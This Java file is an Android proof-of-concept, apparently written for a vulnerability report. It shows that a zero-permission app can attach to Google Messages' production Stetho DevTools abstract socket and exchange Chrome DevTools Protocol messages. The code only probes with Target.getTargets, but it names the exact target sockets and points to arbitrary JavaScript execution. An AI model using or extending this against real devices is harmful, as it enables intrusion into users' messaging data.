package com.vrp.stetho;

import android.app.Activity;
import android.net.LocalSocket;
import android.net.LocalSocketAddress;
import android.os.Bundle;
import android.util.Log;
import android.widget.ScrollView;
import android.widget.TextView;

import java.io.DataInputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.nio.charset.StandardCharsets;

/**
 * PoC: a ZERO-PERMISSION app connects to Google Messages' Stetho DevTools
 * abstract UNIX socket and speaks the Chrome DevTools Protocol to it.
 *
 * Root cause: Messages ships
 *   com.google.android.libraries.stitch.debug.poke.stetho.StethoInitializer
 * in its production (non-debuggable) build. Its static initialiser sets
 * `fezl.b = true` unconditionally, so `StethoInitializer.a()` always runs and
 * binds a Stetho server to the abstract socket
 *     "@stetho_<process-name>_devtools_remote"
 *
 * Abstract UNIX sockets live in a network-wide namespace. Unlike a filesystem
 * socket there is no inode to chmod, and the framework applies no
 * SELinux/permission check to connect() on one, so ANY app on the device that
 * knows the (fully predictable) name can attach to it and drive the DevTools
 * protocol inside the Messages process.
 *
 * Stetho's DevTools server exposes the app's WebViews and, through them,
 * `Runtime.evaluate` -- i.e. arbitrary JavaScript execution inside the Messages
 * process's WebViews, with access to their DOM, cookies and JS bridges.
 */
public class StethoProbeActivity extends Activity {

    private static final String TAG = "STETHO_POC";
    private TextView out;

    private static final String[] TARGET_SOCKETS = {
        "stetho_com.google.android.apps.messaging_devtools_remote",
        "stetho_com.google.android.apps.messaging:rcs_devtools_remote",
    };

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        out = new TextView(this);
        out.setTextSize(11f);
        out.setPadding(8, 8, 8, 8);
        ScrollView sv = new ScrollView(this);
        sv.addView(out);
        setContentView(sv);
        new Thread(this::run).start();
    }

    private void log(String s) {
        Log.i(TAG, s);
        runOnUiThread(() -> out.append(s + "\n"));
    }

    private void run() {
        log("=== Stetho DevTools reachable from a ZERO-PERMISSION app ===");
        log("uid=" + android.os.Process.myUid() + "  pkg=" + getPackageName());
        log("declared permissions in this APK: NONE");

        boolean any = false;
        for (String sock : TARGET_SOCKETS) {
            log("\n---- " + sock + " ----");
            try {
                probe(sock);
                any = true;
            } catch (Throwable t) {
                log("  FAILED: " + t);
            }
        }
        log("\n=== RESULT: " + (any ? "AT LEAST ONE SOCKET REACHED"
                                      : "no socket reachable") + " ===");
    }

    /** Connect and run one CDP round-trip. */
    private void probe(String name) throws Exception {
        // Abstract namespace: Namespace.ABSTRACT addresses "@name" with no
        // filesystem path, so there is no inode whose mode could restrict us.
        LocalSocket s = new LocalSocket();
        s.connect(new LocalSocketAddress(name));
        s.setSoTimeout(6000);
        log("  [CONNECTED] abstract@" + name);

        InputStream in = new DataInputStream(s.getInputStream());
        OutputStream os = s.getOutputStream();

        // Stetho frames each CDP message as: 4-byte BE length + JSON body.
        cdp(os, 1, "Target.getTargets", "{}");

        for (int i = 0; i < 4; i++) {
            String m;
            try {
                m = readMessage(in);
            } catch (Exception e) {
                log("  [read closed] " + e);
                break;
            }
            log("  << " + trunc(m, 900));
            if (m.contains("\"id\":1") || m.contains("\"id\": 1")) {
                break;
            }
        }
        s.close();
    }

    private void cdp(OutputStream os, int id, String method, String params) throws Exception {
        String body = "{\"id\":" + id + ",\"method\":\"" + method + "\",\"params\":" + params + "}";
        byte[] b = body.getBytes(StandardCharsets.UTF_8);
        os.write(new byte[]{(byte) (b.length >>> 24), (byte) (b.length >>> 16),
                            (byte) (b.length >>> 8), (byte) b.length});
        os.write(b);
        os.flush();
        log("  >> " + body);
    }

    private String readMessage(InputStream in) throws Exception {
        int n = 0;
        for (int i = 0; i < 4; i++) {
            int b = in.read();
            if (b < 0) throw new java.io.EOFException("eof in header");
            n = (n << 8) | b;
        }
        if (n <= 0 || n > 8 * 1024 * 1024) {
            throw new java.io.IOException("implausible frame length " + n);
        }
        byte[] buf = new byte[n];
        int off = 0;
        while (off < n) {
            int r = in.read(buf, off, n - off);
            if (r < 0) throw new java.io.EOFException("eof in body");
            off += r;
        }
        return new String(buf, StandardCharsets.UTF_8);
    }

    private static String trunc(String s, int n) {
        return s.length() <= n ? s : s.substring(0, n) + "...[truncated]";
    }
}